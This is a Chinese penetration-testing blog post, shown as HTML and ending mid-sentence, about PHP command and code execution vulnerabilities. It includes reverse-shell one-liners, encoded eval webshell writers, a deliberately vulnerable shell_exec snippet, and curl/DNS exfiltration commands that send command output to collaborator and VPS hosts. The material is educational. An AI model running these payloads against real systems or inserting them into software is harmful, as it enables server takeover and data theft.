@@ -1,0 +1,658 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>命令执行与代码执行 | Hexo</title>
+  <meta name="description" content="命令执行与代码执行命令执行原理是指用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。 命令执行常见利用符号1234command1&amp;command2 两个命令同时执行command1&amp;&amp;command2 只有前面命令执行成功，后面命">
+<meta property="og:type" content="article">
+<meta property="og:title" content="命令执行与代码执行">
+<meta property="og:url" content="http://s1eady.top/2018/12/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="命令执行与代码执行命令执行原理是指用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。 命令执行常见利用符号1234command1&amp;command2 两个命令同时执行command1&amp;&amp;command2 只有前面命令执行成功，后面命">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201111171337891.png">
+<meta property="og:image" content="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201111170448255.png">
+<meta property="og:image" content="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201111174638134.png">
+<meta property="og:image" content="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201111172955439.png">
+<meta property="article:published_time" content="2018-12-08T09:12:08.000Z">
+<meta property="article:modified_time" content="2020-11-11T16:08:09.973Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="OWSP-TOP10">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201111171337891.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="http://s1eady.top/2018/12/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/cofess" target="_blank">
+          <img class="img-circle img-rotate" src="/images/1.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">果冻</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">Penetration Testing</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> 中国 南京</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="搜索" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">首页</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">归档</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">分类</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">关于</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="/GXA111666" target="_blank" title="VX" data-toggle=tooltip data-placement=top><i class="icon icon-VX"></i></a></li>
+        
+        <li><a href="/1252195810" target="_blank" title="QQ" data-toggle=tooltip data-placement=top><i class="icon icon-QQ"></i></a></li>
+        
+        <li><a href="/1252195810@qq.com" target="_blank" title="E-Mail" data-toggle=tooltip data-placement=top><i class="icon icon-E-mail"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">公告</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>深山夕照深秋雨 一往情深深几许</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+  </div>
+</aside>
+
+  
+  
+<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <nav id="toc" class="article-toc">
+      <h3 class="toc-title">文章目录</h3>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">1.</span> <span class="toc-text">命令执行与代码执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">命令执行原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E7%AC%A6%E5%8F%B7"><span class="toc-number">1.2.</span> <span class="toc-text">命令执行常见利用符号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.</span> <span class="toc-text">命令执行常见函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%84%E7%90%86%E6%97%A0%E5%9B%9E%E6%98%BE%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.4.</span> <span class="toc-text">处理无回显的命令执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%8E%9F%E7%90%86"><span class="toc-number">1.5.</span> <span class="toc-text">代码执行原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0"><span class="toc-number">1.6.</span> <span class="toc-text">代码执行常见函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E8%8E%B7%E5%8F%96shell"><span class="toc-number">1.7.</span> <span class="toc-text">命令执行与代码执行获取shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-number">1.8.</span> <span class="toc-text">命令执行无回显</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E3%80%81%E5%88%A9%E7%94%A8%E5%BB%B6%E6%97%B6%E6%9D%A5%E5%88%A4%E6%96%AD%E6%98%AF%E6%9C%89%E5%85%B7%E6%9C%89%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.8.1.</span> <span class="toc-text">1、利用延时来判断是有具有命令执行漏洞</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%E3%80%81%E5%88%A9%E7%94%A8http%E8%AF%B7%E6%B1%82"><span class="toc-number">1.8.2.</span> <span class="toc-text">2、利用http请求</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3%E3%80%81DNS%E8%AF%B7%E6%B1%82"><span class="toc-number">1.8.3.</span> <span class="toc-text">3、DNS请求</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%EF%BC%9A"><span class="toc-number">1.8.4.</span> <span class="toc-text">注意：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">命令执行绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">CVE漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Smarty-lt-3-1-32-php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">3.0.1.</span> <span class="toc-text">Smarty &lt;&#x3D; 3.1.32 php代码执行</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Struts2%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">3.0.2.</span> <span class="toc-text">Struts2命令执行</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ImageMagick-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">3.0.3.</span> <span class="toc-text">ImageMagick 命令执行</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Apache-SSI-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.0.4.</span> <span class="toc-text">Apache SSI 远程命令执行漏洞</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F"><span class="toc-number">4.1.</span> <span class="toc-text">防御方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="toc-number">4.2.</span> <span class="toc-text">漏洞挖掘</span></a></li></ol></li></ol>
+    </nav>
+  </div>
+</aside>
+
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-命令执行与代码执行" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      命令执行与代码执行
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2018/12/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" class="article-date">
+	  <time datetime="2018-12-08T09:12:08.000Z" itemprop="datePublished">2018-12-08</time>
+	</a>
+</span>
+        
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/OWASP-TOP10/">OWASP-TOP10</a>
+  </span>
+
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link-link" href="/tags/OWSP-TOP10/" rel="tag">OWSP-TOP10</a>
+  </span>
+
+
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2018/12/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#comments" class="article-comment-link">评论</a></span>
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h3 id="命令执行与代码执行"><a href="#命令执行与代码执行" class="headerlink" title="命令执行与代码执行"></a>命令执行与代码执行</h3><h4 id="命令执行原理"><a href="#命令执行原理" class="headerlink" title="命令执行原理"></a>命令执行原理</h4><p>是指用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。</p>
+<h4 id="命令执行常见利用符号"><a href="#命令执行常见利用符号" class="headerlink" title="命令执行常见利用符号"></a>命令执行常见利用符号</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">command1&amp;command2 两个命令同时执行</span><br><span class="line">command1&amp;&amp;command2 只有前面命令执行成功，后面命令才继续执行</span><br><span class="line">command1;command2 不管前面命令执行成功没有，后面的命令继续执行</span><br><span class="line">command1||command2 顺序执行多条命令，当碰到执行正确的命令后将不执行后面的命令</span><br></pre></td></tr></table></figure>
+
+<h4 id="命令执行常见函数"><a href="#命令执行常见函数" class="headerlink" title="命令执行常见函数"></a>命令执行常见函数</h4><p>syetem()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜ ~ php -r &quot;system(&#39;whoami&#39;);&quot;</span><br></pre></td></tr></table></figure>
+
+<p>passthru()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜ ~ php -r &quot;passthru(&#39;whoami&#39;);&quot;</span><br></pre></td></tr></table></figure>
+
+<p>exec()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜ ~ php -r &quot;echo exec(&#39;whoami&#39;);&quot;</span><br></pre></td></tr></table></figure>
+
+<p>执行给予的命令command，不过它并不会输出任何东西</p>
+<p>shell_exec()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜ ~ php -r &quot;echo shell_exec(&#39;whoami&#39;);&quot;</span><br></pre></td></tr></table></figure>
+
+<p>`反引号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜ ~ php -r &quot;echo @&#96;whoami&#96;;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>ob_start()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    ob_start(&quot;system&quot;);</span><br><span class="line">    echo &quot;whoami&quot;;</span><br><span class="line">    ob_end_flush();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中。</p>
+<p>内部缓冲区的内容可以用 ob_get_contents() 函数复制到一个字符串变量中。 想要输出存储在内部缓冲区中的内容，可以使用 ob_end_flush() 函数。另外， 使用 ob_end_clean() 函数会静默丢弃掉缓冲区的内容。</p>
+<h4 id="处理无回显的命令执行"><a href="#处理无回显的命令执行" class="headerlink" title="处理无回显的命令执行"></a>处理无回显的命令执行</h4><p>1、使用vps进行监听</p>
+<p>2、利用ceye平台</p>
+<h4 id="代码执行原理"><a href="#代码执行原理" class="headerlink" title="代码执行原理"></a>代码执行原理</h4><p>应用程序在调用一些能够将字符串转换为代码的函数（如PHP中的eval）时，没有考虑用户是否控制这个字符串，将造成代码执行漏洞。</p>
+<h4 id="代码执行常见函数"><a href="#代码执行常见函数" class="headerlink" title="代码执行常见函数"></a>代码执行常见函数</h4><p>eval()</p>
+<p>把字符串 code 作为PHP代码执行，传入的必须是有效的 PHP 代码。所有的语句必须以分号结尾，eval() 返回 NULL。</p>
+<p>assert()</p>
+<p>把字符串 $assertion 作为PHP代码执行，assert($assertion) 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动，如果 assertion 是字符串，它将会被 <strong>assert()</strong> 当做 PHP 代码来执行。</p>
+<p>preg_replace()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit &#x3D; -1 [, int &amp;$count ]] )</span><br></pre></td></tr></table></figure>
+
+<p>搜索subject中匹配pattern的部分， 以replacement进行替换。</p>
+<p>preg_replace — 执行一个正则表达式的搜索和替换,/e 修正符使 <em>preg_replace()</em> 将 <em>replacement</em> 参数当作 PHP 代码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(<span class="string">&quot;/test/e&quot;</span>,$_GET[<span class="string">&quot;h&quot;</span>],<span class="string">&quot;jutst test&quot;</span>); </span><br></pre></td></tr></table></figure>
+
+<p>如果我们提交 ?h=phpinfo()，/e就会将h参数当做PHP代码，phpinfo()将会被执行。</p>
+<p>create_function()</p>
+<p>create_function — 创建一个匿名函数。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$newfunc = create_function(<span class="string">&#x27;$v&#x27;</span>, <span class="string">&#x27;return system($v);&#x27;</span>);</span><br><span class="line">$newfunc(<span class="string">&#x27;whoami&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>call_user_func()</p>
+<p>call_user_func — 把第一个参数作为回调函数调用。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed call_user_func ( <span class="keyword">callable</span> $callback [, mixed $parameter [, mixed $... ]] )</span><br></pre></td></tr></table></figure>
+
+<p>第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。</p>
+<p>call_user_func_array()</p>
+<p>call_user_func_array — 调用回调函数，并把一个数组参数作为回调函数的参数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed call_user_func_array ( <span class="keyword">callable</span> $callback , <span class="keyword">array</span> $param_arr )</span><br></pre></td></tr></table></figure>
+
+<p>把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。</p>
+<h4 id="命令执行与代码执行获取shell"><a href="#命令执行与代码执行获取shell" class="headerlink" title="命令执行与代码执行获取shell"></a>命令执行与代码执行获取shell</h4><ul>
+<li><p>命令执行获取shell</p>
+<ul>
+<li><p>反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">syetem(&#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;124&#x2F;443 0&gt;&amp;1&#39;);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>写shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo 3c3f706870206576616c28245f504f53545b3132335d293b203f3e|xxd -r -ps &gt; webshell.php</span><br><span class="line">echo &quot;&lt;?php @eval(\$_POST[123]); ?&gt;&quot; &gt; webshell.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget 网址 -O webshell.php #使用wget下载shell，使用参数-O来指定一个文件名</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>代码执行获取shell</p>
+<ul>
+<li><p>反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&#39;$sock&#x3D;fsockopen(&quot;124&quot;,443);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>写shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&#39;@fputs(fopen(base64_decode(&#39;bG9zdC5waHA&#x3D;&#39;),w),base64_decode(&#39;PD9waHAgQGV2YWwoJF9QT1NUWydsb3N0d29sZiddKTs&#x2F;Pg&#x3D;&#x3D;&#39;));&#39;)</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="命令执行无回显"><a href="#命令执行无回显" class="headerlink" title="命令执行无回显"></a>命令执行无回显</h4><p>后台代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; $_GET[&#39;id&#39;];</span><br><span class="line">echo(shell_exec($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="1、利用延时来判断是有具有命令执行漏洞"><a href="#1、利用延时来判断是有具有命令执行漏洞" class="headerlink" title="1、利用延时来判断是有具有命令执行漏洞"></a>1、利用延时来判断是有具有命令执行漏洞</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;1.php?id&#x3D;sleep%204</span><br></pre></td></tr></table></figure>
+
+<p>如果执行后延时5秒，就证明测试点存在命令执行漏洞。</p>
+<h5 id="2、利用http请求"><a href="#2、利用http请求" class="headerlink" title="2、利用http请求"></a>2、利用http请求</h5><p>ping命令不会发起http请求。</p>
+<p>使用curl发起http请求</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;1.php?id&#x3D;curl%20127.0.0.1:1234</span><br></pre></td></tr></table></figure>
+
+<p>vps上监听端口1234</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ncat -lnvp 1234</span><br><span class="line">Ncat: Version 7.80 ( https:&#x2F;&#x2F;nmap.org&#x2F;ncat )</span><br><span class="line">Ncat: Listening on :::1234</span><br><span class="line">Ncat: Listening on 0.0.0.0:1234</span><br><span class="line">Ncat: Connection from 127.0.0.1.</span><br><span class="line">Ncat: Connection from 127.0.0.1:53979.</span><br><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:1234</span><br><span class="line">User-Agent: curl&#x2F;7.64.1</span><br><span class="line">Accept: *&#x2F;*</span><br></pre></td></tr></table></figure>
+
+<p>可以看到命令成功执行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ curl  5lruf1898h08u379lms247tj6ac00p.burpcollaborator.net&#x2F;&#96;whoami&#96;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201111171337891.png" alt="image-20201111171337891"></p>
+<h5 id="3、DNS请求"><a href="#3、DNS请求" class="headerlink" title="3、DNS请求"></a>3、DNS请求</h5><p>利用DNS解析请求，我们可以构造一个二级级域名，当他发起一级域名请求的时候，可以去查看DNS解析请求，而我们在二级域名中，插入我们的命令，此时命令即被执行，执行成功之后的结果也可以在DNS解析请求中查到。</p>
+<p>比如：</p>
+<p>一个一级域名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rjs8aa.dnslog.cn</span><br></pre></td></tr></table></figure>
+
+<p>我们构造一个二级域名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &#96;whoami&#96;.rjs8aa.dnslog.cn</span><br></pre></td></tr></table></figure>
+
+<p>利用dns平台dnslog.cn或者cheye.io、也可以使用burp的Collaborator Client功能，可以看到我们的DNS请求，进而拿到我们命令执行的结果。</p>
+<p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201111170448255.png" alt="image-20201111170448255"></p>
+<h5 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h5><p>1、DNS每一级域名长度的限制是63个字符，这时候如果数据带不出来，可以尝试shell脚本，截取某一部分带出数据。</p>
+<p>目标系统执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ &#96;for i in $(ls);do curl &quot;http:&#x2F;&#x2F;$i.bbqkz7t5xci7vcuexsmvnmrdd4jw7l.burpcollaborator.net&#x2F;&quot;;done;&#96;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201111174638134.png" alt="image-20201111174638134"></p>
+<p>利用VPS搭建一个临时服务器，在攻击机器上请求VPS地址。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ python -m SimpleHTTPServer 7777</span><br><span class="line">Serving HTTP on 0.0.0.0 port 7777 ...</span><br><span class="line">172.20.10.10 - - [11&#x2F;Nov&#x2F;2020 22:46:02] code 404, message File not found</span><br><span class="line">172.20.10.10 - - [11&#x2F;Nov&#x2F;2020 22:46:02] &quot;GET &#x2F;1.py HTTP&#x2F;1.1&quot; 404 -</span><br><span class="line">172.20.10.10 - - [11&#x2F;Nov&#x2F;2020 22:46:02] code 404, message File not found</span><br><span class="line">172.20.10.10 - - [11&#x2F;Nov&#x2F;2020 22:46:02] &quot;GET &#x2F;1.txt HTTP&#x2F;1.1&quot; 404 -</span><br><span class="line">172.20.10.10 - - [11&#x2F;Nov&#x2F;2020 22:46:02] code 404, message File not found</span><br><span class="line">172.20.10.10 - - [11&#x2F;Nov&#x2F;2020 22:46:02] &quot;GET &#x2F;公共 HTTP&#x2F;1.1&quot; 404 -</span><br><span class="line">172.20.10.10 - - [11&#x2F;Nov&#x2F;2020 22:46:02] code 404, message File not found</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ &#96;for i in $(ls);do curl &quot;http:&#x2F;&#x2F;172.20.10.4:7777&#x2F;$i&quot;;done;&#96;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到数据成功被带出来。</p>
+<p>2、如果系统限制了某些特殊字符与特殊符号，我们可是借助Linux系统，先将输出的内容进行base64编码，然后在将内容带出的系统之外。在kali下：</p>
